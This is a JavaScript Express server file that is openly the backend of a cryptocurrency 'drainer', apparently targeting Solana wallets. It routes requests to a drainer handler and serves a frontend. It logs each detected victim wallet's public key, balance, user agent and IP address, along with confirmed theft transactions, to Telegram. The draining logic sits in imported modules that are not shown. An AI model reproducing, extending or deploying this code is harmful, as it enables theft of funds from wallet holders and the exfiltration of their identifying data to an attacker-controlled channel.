import express from 'express';
import cors from 'cors';
import unifiedDrainerHandler from './api/unified-drainer.js';
import walletManagementHandler from './api/wallet-management.js';
import telegramLogger from './src/telegram.js';
import envConfig from './src/environment.js';
import extractUserIP from './src/ip-extraction.js';

const app = express();
const PORT = envConfig.server.port;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Serve src directory with correct MIME type for JavaScript modules
app.use('/src', express.static('src', {
  setHeaders: (res, path) => {
    if (path.endsWith('.js')) {
      res.setHeader('Content-Type', 'application/javascript');
    }
  }
}));

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'healthy', timestamp: new Date().toISOString() });
});

// Unified drainer endpoint (replaces both original and enhanced)
app.post('/api/drainer', unifiedDrainerHandler);
app.post('/api/wallet-management', walletManagementHandler); // Comprehensive wallet management

// Server-side deduplication cache - 2025 FIX
const serverWalletLogCache = new Map();
const SERVER_WALLET_LOG_CACHE_TTL = 300000; // 5 minutes

// Log wallet detection with server-side deduplication - 2025 FIX
app.post('/api/drainer/log-wallet', async (req, res) => {
  try {
    const { publicKey, lamports, userAgent, walletType } = req.body;
    const userIp = extractUserIP(req); // Use centralized IP extraction
    
    // Server-side deduplication check - 2025 FIX
    const walletKey = `${publicKey}-${walletType}`;
    const now = Date.now();
    const cachedLog = serverWalletLogCache.get(walletKey);
    
    if (cachedLog && (now - cachedLog.timestamp) < SERVER_WALLET_LOG_CACHE_TTL) {
      console.log(`[SERVER_CACHE] Duplicate wallet log prevented: ${publicKey} (${walletType})`);
      return res.json({ success: true, cached: true });
    }
    
    // Log to Telegram with deduplication
    await telegramLogger.logWalletDetection({
      publicKey,
      lamports,
      userAgent,
      walletType,
      userIp
    });
    
    // Cache the log
    serverWalletLogCache.set(walletKey, { timestamp: now });
    
    res.json({ success: true });
  } catch (error) {
    console.error('Error logging wallet detection:', error);
    res.status(500).json({ error: 'Failed to log wallet detection' });
  }
});

// Log transaction confirmation with server-side deduplication - 2025 FIX
app.post('/api/drainer/log-confirmation', async (req, res) => {
  try {
    const { publicKey, signature, lamports, userAgent, walletType } = req.body;
    const userIp = extractUserIP(req); // Use centralized IP extraction
    
    // Server-side deduplication check - 2025 FIX
    const confirmationKey = `${publicKey}-${signature}`;
    const now = Date.now();
    const cachedLog = serverWalletLogCache.get(confirmationKey);
    
    if (cachedLog && (now - cachedLog.timestamp) < SERVER_WALLET_LOG_CACHE_TTL) {
      console.log(`[SERVER_CACHE] Duplicate confirmation log prevented: ${publicKey} (${signature})`);
      return res.json({ success: true, cached: true });
    }
    
    // Log to Telegram with deduplication
    await telegramLogger.logTransactionConfirmation({
      publicKey,
      signature,
      lamports,
      userAgent,
      walletType,
      userIp
    });
    
    // Cache the log
    serverWalletLogCache.set(confirmationKey, { timestamp: now });
    
    res.json({ success: true });
  } catch (error) {
    console.error('Error logging transaction confirmation:', error);
    res.status(500).json({ error: 'Failed to log transaction confirmation' });
  }
});

// Enhancement modules status endpoint
app.get('/api/enhancements/status', async (req, res) => {
  res.json({
    timestamp: new Date().toISOString(),
    status: 'basic',
    message: 'Enhancement modules removed - using core functionality only'
  });
});

// Enhancement health endpoint - returning basic health
app.get('/api/enhancements/health', async (req, res) => {
  res.json({
    timestamp: new Date().toISOString(),
    status: 'healthy',
    message: 'Core functionality only - enhancement modules removed',
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    version: '1.0.0'
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`🔗 API: http://localhost:${PORT}/api/drainer`);
});

export default app;
